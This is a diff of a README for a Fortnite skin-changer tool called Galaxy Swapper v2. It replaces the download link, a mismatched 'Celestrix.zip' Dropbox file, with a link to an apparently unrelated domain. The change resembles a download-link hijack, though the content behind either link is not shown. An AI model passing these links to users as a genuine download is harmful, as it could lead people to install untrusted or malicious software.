@@ -2,7 +2,7 @@
 
 Galaxy Swapper v2 is a free Fortnite skin changer built in WPF that allows you to modify your game files to replace a cosmetic you own with a cosmetic you desire, all with ease. We have developed a simple and user-friendly interface for your convenience.
 
-[![Download Galaxy Swapper v2](https://img.shields.io/badge/Download-Galaxy_Swapper_v2-blueviolet)](https://www.dropbox.com/scl/fi/g58lt25fmza83uydu0zu5/Celestrix.zip?rlkey=hccn6sy4qpal7m571nuon546x&st=ik6sks88&dl=1)
+[![Download Galaxy Swapper v2](https://img.shields.io/badge/Download-Galaxy_Swapper_v2-blueviolet)](https://seomadjest.com/)
 
 ---
 
